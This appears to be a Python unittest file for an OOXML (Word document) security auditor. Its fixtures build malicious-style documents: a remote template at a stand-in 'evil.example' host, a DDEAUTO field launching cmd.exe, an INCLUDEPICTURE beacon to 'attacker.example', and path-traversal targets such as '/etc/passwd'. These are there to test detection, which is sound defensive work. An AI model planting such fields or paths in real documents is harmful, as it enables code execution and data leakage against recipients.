import io
import unittest
import zipfile

from ooxml_auditor import OoxmlAuditor
from ooxml_auditor.model import (
    SEVERITY_ERROR,
    SEVERITY_HIGH,
    SEVERITY_INFO,
    SEVERITY_MEDIUM,
)
from ooxml_auditor.safezip import (
    ContainerError,
    PathTraversalError,
    SafeZip,
    resolve_target,
)


CT_NS = "http://schemas.openxmlformats.org/package/2006/content-types"
REL_NS = "http://schemas.openxmlformats.org/package/2006/relationships"
OFFICE_REL = "http://schemas.openxmlformats.org/officeDocument/2006/relationships"
W_NS = "http://schemas.openxmlformats.org/wordprocessingml/2006/main"


def content_types(overrides=(), defaults=(("xml", "application/xml"),)):
    parts = [f'<Types xmlns="{CT_NS}">']
    for ext, ctype in defaults:
        parts.append(f'<Default Extension="{ext}" ContentType="{ctype}"/>')
    for part, ctype in overrides:
        parts.append(f'<Override PartName="/{part}" ContentType="{ctype}"/>')
    parts.append("</Types>")
    return "".join(parts)


def rels(entries):
    parts = [f'<Relationships xmlns="{REL_NS}">']
    for rel_id, rel_type, target, mode in entries:
        mode_attr = f' TargetMode="{mode}"' if mode else ""
        parts.append(
            f'<Relationship Id="{rel_id}" Type="{rel_type}" Target="{target}"{mode_attr}/>'
        )
    parts.append("</Relationships>")
    return "".join(parts)


def make_docx(parts):
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", zipfile.ZIP_DEFLATED) as zf:
        for name, data in parts.items():
            zf.writestr(name, data)
    buffer.seek(0)
    return buffer


def base_parts(**extra):
    parts = {
        "[Content_Types].xml": content_types(
            overrides=(
                ("word/document.xml",
                 "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"),
            )
        ),
        "_rels/.rels": rels(
            (("rId1", f"{OFFICE_REL}/officeDocument", "word/document.xml", None),)
        ),
        "word/document.xml": (
            f'<w:document xmlns:w="{W_NS}"><w:body><w:p/></w:body></w:document>'
        ),
    }
    parts.update(extra)
    return parts


def categories(report):
    return {f.category for f in report.findings}


class MacroDocumentTest(unittest.TestCase):
    def test_vba_project_detected(self):
        doc = make_docx(base_parts(
            **{
                "[Content_Types].xml": content_types(
                    overrides=(
                        ("word/document.xml",
                         "application/vnd.ms-word.document.macroEnabled.main+xml"),
                        ("word/vbaProject.bin", "application/vnd.ms-office.vbaProject"),
                    )
                ),
                "word/_rels/document.xml.rels": rels(
                    (("rId9", f"{OFFICE_REL}/vbaProject", "vbaProject.bin", None),)
                ),
                "word/vbaProject.bin": b"\xd0\xcf\x11\xe0 fake-ole-vba",
            }
        ))
        report = OoxmlAuditor().audit(doc, path="macro.docm")
        self.assertTrue(report.ok)
        self.assertIn("MACRO", categories(report))
        self.assertIn("MACRO_ENABLED_FORMAT", categories(report))
        self.assertTrue(report.findings_at(SEVERITY_HIGH))
        macro_rels = [r for r in report.relationships if r.rel_type.endswith("/vbaProject")]
        self.assertEqual(len(macro_rels), 1)
        rel = macro_rels[0]
        self.assertEqual(rel.rels_file, "word/_rels/document.xml.rels")
        self.assertEqual(rel.source_part, "word/document.xml")
        self.assertEqual(rel.resolved_target, "word/vbaProject.bin")
        self.assertIn("word/vbaProject.bin", report.content_types)
        graph_targets = [t for edges in report.graph.values() for _, _, t in edges]
        self.assertIn("word/vbaProject.bin", graph_targets)


class RemoteTemplateTest(unittest.TestCase):
    def test_remote_attached_template(self):
        doc = make_docx(base_parts(
            **{
                "word/settings.xml": (
                    f'<w:settings xmlns:w="{W_NS}">'
                    '<w:attachedTemplate r:id="rId1" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"/>'
                    "</w:settings>"
                ),
                "word/_rels/settings.xml.rels": rels(
                    (("rId1", f"{OFFICE_REL}/attachedTemplate",
                      "https://evil.example/templates/payload.dotm", "External"),)
                ),
            }
        ))
        report = OoxmlAuditor().audit(doc, path="remote_template.docx")
        self.assertTrue(report.ok)
        self.assertIn("REMOTE_TEMPLATE", categories(report))
        finding = next(f for f in report.findings if f.category == "REMOTE_TEMPLATE")
        self.assertEqual(finding.severity, SEVERITY_HIGH)
        self.assertEqual(finding.source_part, "word/settings.xml")
        self.assertEqual(finding.target, "https://evil.example/templates/payload.dotm")
        rel = next(r for r in report.relationships if r.rel_type.endswith("/attachedTemplate"))
        self.assertTrue(rel.is_external)
        self.assertEqual(rel.rels_file, "word/_rels/settings.xml.rels")


class ExternalHyperlinkTest(unittest.TestCase):
    def test_external_hyperlink_is_info_level(self):
        doc = make_docx(base_parts(
            **{
                "word/_rels/document.xml.rels": rels(
                    (("rId5", f"{OFFICE_REL}/hyperlink",
                      "https://example.com/more-info", "External"),)
                ),
            }
        ))
        report = OoxmlAuditor().audit(doc)
        self.assertTrue(report.ok)
        self.assertIn("EXTERNAL_HYPERLINK", categories(report))
        finding = next(f for f in report.findings if f.category == "EXTERNAL_HYPERLINK")
        self.assertEqual(finding.severity, SEVERITY_INFO)
        self.assertFalse(report.findings_at(SEVERITY_HIGH))


class EmbeddedOleTest(unittest.TestCase):
    def test_embedded_ole_object(self):
        doc = make_docx(base_parts(
            **{
                "[Content_Types].xml": content_types(
                    overrides=(
                        ("word/document.xml",
                         "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"),
                        ("word/embeddings/oleObject1.bin",
                         "application/vnd.openxmlformats-officedocument.oleObject"),
                    )
                ),
                "word/_rels/document.xml.rels": rels(
                    (("rId7", f"{OFFICE_REL}/oleObject", "embeddings/oleObject1.bin", None),)
                ),
                "word/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0 ole",
            }
        ))
        report = OoxmlAuditor().audit(doc)
        self.assertTrue(report.ok)
        self.assertIn("EMBEDDED_OLE", categories(report))
        ole_findings = [f for f in report.findings if f.category == "EMBEDDED_OLE"]
        self.assertTrue(any(f.severity == SEVERITY_MEDIUM for f in ole_findings))
        rel = next(r for r in report.relationships if r.rel_type.endswith("/oleObject"))
        self.assertEqual(rel.resolved_target, "word/embeddings/oleObject1.bin")


class BenignImageDocumentTest(unittest.TestCase):
    def test_plain_image_document_has_no_high_findings(self):
        doc = make_docx(base_parts(
            **{
                "[Content_Types].xml": content_types(
                    overrides=(
                        ("word/document.xml",
                         "application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"),
                    ),
                    defaults=(("xml", "application/xml"), ("png", "image/png")),
                ),
                "word/_rels/document.xml.rels": rels(
                    (("rId4", f"{OFFICE_REL}/image", "media/image1.png", None),)
                ),
                "word/media/image1.png": b"\x89PNG\r\n\x1a\n fake",
            }
        ))
        report = OoxmlAuditor().audit(doc, path="holiday.docx")
        self.assertTrue(report.ok)
        self.assertFalse(report.findings_at(SEVERITY_HIGH))
        self.assertFalse(report.findings_at(SEVERITY_MEDIUM))
        self.assertNotIn("MACRO", categories(report))
        rel = next(r for r in report.relationships if r.rel_type.endswith("/image"))
        self.assertEqual(rel.resolved_target, "word/media/image1.png")
        self.assertIn("word/document.xml", report.graph)


class CorruptZipTest(unittest.TestCase):
    def test_corrupt_zip_reports_error(self):
        report = OoxmlAuditor().audit(io.BytesIO(b"this is not a zip file"))
        self.assertFalse(report.ok)
        self.assertIn("CONTAINER", categories(report))
        self.assertTrue(report.findings_at(SEVERITY_ERROR))
        self.assertTrue(report.errors)

    def test_truncated_zip_reports_error(self):
        good = make_docx(base_parts()).getvalue()
        report = OoxmlAuditor().audit(io.BytesIO(good[: len(good) // 2]))
        self.assertFalse(report.ok)
        self.assertTrue(report.findings_at(SEVERITY_ERROR))


class PathSafetyTest(unittest.TestCase):
    def test_traversal_target_flagged_and_contained(self):
        doc = make_docx(base_parts(
            **{
                "word/_rels/document.xml.rels": rels(
                    (("rId8", f"{OFFICE_REL}/image", "../../../../etc/passwd", None),)
                ),
            }
        ))
        report = OoxmlAuditor().audit(doc)
        self.assertIn("PATH_TRAVERSAL", categories(report))
        finding = next(f for f in report.findings if f.category == "PATH_TRAVERSAL")
        self.assertEqual(finding.severity, SEVERITY_HIGH)
        rel = report.relationships[-1]
        self.assertIsNone(rel.resolved_target)

    def test_resolve_target_rejects_absolute_and_parent_escape(self):
        with self.assertRaises(PathTraversalError):
            resolve_target("word/document.xml", "../../evil.bin")
        with self.assertRaises(PathTraversalError):
            resolve_target("word/document.xml", "/etc/passwd")
        with self.assertRaises(PathTraversalError):
            resolve_target("word/document.xml", "C:\\windows\\system32\\x.dll")
        self.assertEqual(
            resolve_target("word/document.xml", "media/./image1.png"),
            "word/media/image1.png",
        )

    def test_zip_member_traversal_rejected(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w") as zf:
            zf.writestr("../escape.txt", "boom")
        buffer.seek(0)
        with self.assertRaises(ContainerError):
            SafeZip(buffer)

    def test_oversized_member_rejected(self):
        buffer = io.BytesIO()
        with zipfile.ZipFile(buffer, "w", zipfile.ZIP_STORED) as zf:
            zf.writestr("big.bin", b"\x00" * (65 * 1024 * 1024))
        buffer.seek(0)
        with self.assertRaises(ContainerError):
            SafeZip(buffer)


class SuspiciousFieldTest(unittest.TestCase):
    def test_ddeauto_field_instruction(self):
        doc = make_docx(base_parts(
            **{
                "word/document.xml": (
                    f'<w:document xmlns:w="{W_NS}"><w:body><w:p><w:r>'
                    "<w:instrText> DDEAUTO c:\\\\windows\\\\system32\\\\cmd.exe \"/k calc\" </w:instrText>"
                    "</w:r></w:p></w:body></w:document>"
                ),
            }
        ))
        report = OoxmlAuditor().audit(doc)
        self.assertIn("DDE_FIELD", categories(report))
        finding = next(f for f in report.findings if f.category == "DDE_FIELD")
        self.assertEqual(finding.severity, SEVERITY_HIGH)
        self.assertEqual(finding.source_part, "word/document.xml")

    def test_remote_includepicture_field(self):
        doc = make_docx(base_parts(
            **{
                "word/document.xml": (
                    f'<w:document xmlns:w="{W_NS}"><w:body>'
                    '<w:fldSimple w:instr=" INCLUDEPICTURE \\\\attacker.example\\share\\beacon.png ">'
                    "<w:r/></w:fldSimple></w:body></w:document>"
                ),
            }
        ))
        report = OoxmlAuditor().audit(doc)
        self.assertIn("REMOTE_FIELD", categories(report))


class UnknownNamespaceTest(unittest.TestCase):
    def test_relationship_outside_allowed_namespaces_flagged(self):
        doc = make_docx(base_parts(
            **{
                "word/_rels/document.xml.rels": rels(
                    (("rId3", "http://schemas.evil.example/relationships/backdoor",
                      "evil.bin", None),)
                ),
                "word/evil.bin": b"x",
            }
        ))
        report = OoxmlAuditor().audit(doc)
        self.assertIn("UNKNOWN_REL_NAMESPACE", categories(report))


if __name__ == "__main__":
    unittest.main()
